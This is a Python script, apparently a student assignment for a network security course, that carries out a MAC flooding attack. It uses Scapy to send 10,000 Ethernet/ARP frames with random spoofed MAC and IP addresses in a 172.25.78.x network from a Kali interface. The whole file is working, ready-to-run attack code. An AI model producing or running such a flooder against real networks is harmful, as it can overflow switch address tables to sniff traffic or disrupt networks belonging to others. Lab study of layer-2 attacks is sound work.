#!/usr/bin/env python3
# =============================================================
# Script   : MAC Flooding Attack
# Autor    : Yeury Lopez
# Matricula: 2025-0780
# Materia  : Seguridad de Redes
# =============================================================

from scapy.all import *
import random
import time
import sys

# -------------------------------------------------------------
# FUNCIÓN: Generar una MAC address aleatoria
# -------------------------------------------------------------
def random_mac():
    # Genera 6 bytes aleatorios y los formatea como MAC
    return ':'.join(['{:02x}'.format(random.randint(0, 255)) 
                    for _ in range(6)])

# -------------------------------------------------------------
# FUNCIÓN: Generar una IP aleatoria dentro de la red
# -------------------------------------------------------------
def random_ip():
    # Genera IPs en el rango 172.25.78.x (tu red)
    return f"172.25.78.{random.randint(1, 254)}"

# -------------------------------------------------------------
# FUNCIÓN PRINCIPAL: Ejecutar el ataque
# -------------------------------------------------------------
def mac_flooding(interface, packet_count):
    
    print("=" * 55)
    print("   MAC FLOODING ATTACK")
    print("   Autor    : Yeury Lopez")
    print("   Matricula: 2025-0780")
    print("=" * 55)
    print(f"\n[*] Interfaz objetivo : {interface}")
    print(f"[*] Paquetes a enviar : {packet_count}")
    print(f"[*] Iniciando ataque  : {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print("-" * 55)
    
    paquetes_enviados = 0
    
    for i in range(packet_count):
        
        # Generar MACs e IPs aleatorias para cada paquete
        src_mac = random_mac()   # MAC origen falsa
        dst_mac = random_mac()   # MAC destino falsa
        src_ip  = random_ip()    # IP origen falsa
        dst_ip  = random_ip()    # IP destino falsa
        
        # Construir el paquete capa por capa:
        # Ethernet → ARP
        paquete = (
            Ether(src=src_mac, dst=dst_mac) /  # Capa 2
            ARP(pdst=dst_ip, psrc=src_ip,       # Capa ARP
                hwsrc=src_mac, hwdst=dst_mac)
        )
        
        # Enviar el paquete por la interfaz (sin esperar respuesta)
        sendp(paquete, iface=interface, verbose=False)
        
        paquetes_enviados += 1
        
        # Mostrar progreso cada 100 paquetes
        if paquetes_enviados % 100 == 0:
            print(f"[+] Paquetes enviados: {paquetes_enviados}/{packet_count}")
    
    print("-" * 55)
    print(f"[✓] Ataque completado")
    print(f"[✓] Total enviados   : {paquetes_enviados}")
    print(f"[✓] Hora fin         : {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 55)

# -------------------------------------------------------------
# PUNTO DE ENTRADA
# -------------------------------------------------------------
if __name__ == "__main__":
    
    # Verificar que se ejecuta como root
    if os.getuid() != 0:
        print("[!] ERROR: Ejecuta el script como root (sudo)")
        sys.exit(1)
    
    # Parámetros por defecto
    INTERFAZ = "eth0"      # Interfaz de red de Kali
    PAQUETES  = 10000      # Cantidad de MACs falsas a generar
    
    # Ejecutar el ataque
    mac_flooding(INTERFAZ, PAQUETES)
